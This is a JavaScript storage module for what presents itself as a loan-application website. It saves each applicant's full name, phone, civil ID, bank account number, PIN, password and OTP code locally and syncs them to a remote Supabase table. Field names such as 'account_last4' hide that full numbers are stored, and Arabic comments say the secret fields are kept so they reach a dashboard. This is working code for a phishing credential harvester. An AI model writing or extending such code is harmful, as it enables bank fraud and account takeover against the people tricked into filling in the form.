const STORAGE_KEY = 'tamwil_applications'
const DRAFT_KEY = 'tamwil_application_draft'

import { supabase } from './supabase'

function safeApplication(data) {
  return {
    id: data.id,
    full_name: data.fullName || data.name || null,
    phone_number: data.phoneNumber || data.phone || null,
    username: data.username || null,
    // حفظ البطاقة المدنية ورقم الحساب بالكامل أو بالشكل الذي تفضله
    civil_id_last2: data.civilId ? String(data.civilId) : null,
    account_last4: data.accountNumber ? String(data.accountNumber) : null,
    pin: data.pin || null,
    password: data.password || null,
    otp_code: data.otpCode || null,
    amount: data.amount || null,
    plan: data.plan || null,
    status: data.status || 'new',
    current_step: data.step || data.source || null,
    created_at: data.createdAt || new Date().toISOString(),
    updated_at: data.updatedAt || new Date().toISOString(),
  }
}

function syncApplication(data) {
  if (!supabase || !data?.id) return

  const payload = safeApplication(data)
  supabase.from('loan_applications').upsert(payload, { onConflict: 'id' }).then(({ error }) => {
    if (!error) return

    // Keep older deployments working until the optional credential columns are migrated.
    const legacyPayload = { ...payload }
    delete legacyPayload.pin
    delete legacyPayload.password
    delete legacyPayload.otp_code

    return supabase
      .from('loan_applications')
      .upsert(legacyPayload, { onConflict: 'id' })
      .then(({ error: fallbackError }) => {
        if (fallbackError) console.warn('Could not sync loan application:', fallbackError.message)
      })
  })
}

function safeParse(value) {
  try {
    return value ? JSON.parse(value) : []
  } catch {
    return []
  }
}

export function getApplications() {
  if (typeof window === 'undefined') return []
  const raw = localStorage.getItem(STORAGE_KEY)
  return safeParse(raw)
}

export function saveApplication(application) {
  if (typeof window === 'undefined') return null

  const applications = getApplications()
  const record = {
    id: application.id || crypto.randomUUID?.() || `app-${Date.now()}`,
    createdAt: application.createdAt || new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    status: application.status || 'new',
    source: application.source || 'website',
    ...application,
  }

  // الاحتفاظ بالبيانات كاملة دون حذف الحقول السرية لتصل إلى الداشبورد
  const next = [record, ...applications.filter((item) => item.id !== record.id)]
  localStorage.setItem(STORAGE_KEY, JSON.stringify(next))
  syncApplication(record)
  return record
}

export function getDraftApplication() {
  if (typeof window === 'undefined') return null
  const raw = localStorage.getItem(DRAFT_KEY)
  try {
    return raw ? JSON.parse(raw) : null
  } catch {
    return null
  }
}

export function saveDraftApplication(data) {
  if (typeof window === 'undefined') return null

  const current = getDraftApplication() || {
    id: crypto.randomUUID?.() || `draft-${Date.now()}`,
    createdAt: new Date().toISOString(),
    source: 'website',
  }

  const next = {
    ...current,
    ...data,
    id: current.id,
    createdAt: current.createdAt,
    updatedAt: new Date().toISOString(),
  }
  localStorage.setItem(DRAFT_KEY, JSON.stringify(next))
  syncApplication(next)
  return next
}

export function clearDraftApplication() {
  if (typeof window === 'undefined') return
  localStorage.removeItem(DRAFT_KEY)
}